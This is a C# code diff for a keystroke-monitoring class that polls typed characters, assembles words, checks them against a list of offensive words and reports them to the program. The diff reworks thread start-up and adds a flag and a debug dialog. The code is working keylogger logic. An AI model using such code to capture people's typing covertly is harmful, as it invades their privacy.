@@ -16,16 +16,14 @@ namespace ClientSide
     {
 
         string input = "";
-        public MonitorTyping()
-        {
-
-            base.monitorAlive = true;
-            base.monitorThread = new Thread(playKeyLogger);
-            base.monitorThread.Start();
-            
-        }
+        public bool ifLive;
+        public MonitorTyping() { }
         public override void playThreadMonitor()
         {
+            if (base.monitorAlive)
+            {
+                stopThreadMonitor();
+            }
             base.monitorAlive = true;
             base.monitorThread = new Thread(playKeyLogger);
             base.monitorThread.Start();
@@ -50,8 +48,8 @@ namespace ClientSide
         {
             List<string> offensiveWords = base.SettingInstance.getWord();
             input = "";
-            bool flag = true;
-            while (flag)
+             
+            while (base.monitorAlive)
             {
                 Thread.Sleep(5);
                 for (int i = 32; i < 127; i++)
@@ -63,9 +61,13 @@ namespace ClientSide
 
                         if (i == 32) // if type space 
                         {
-                             
-                            wordFromKeylogger handler = Program.updateCurrentKeylogger;
-                            handler(input);
+                            ShowErrorDialog(input+", "+ifLive);
+                            if(ifLive)
+                            {
+                                wordFromKeylogger handler = Program.updateCurrentKeylogger;
+                                handler(input);
+                            }
+                            
 
                             //ShowErrorDialog(input);
                             string replacement = input.Replace(" ", "");
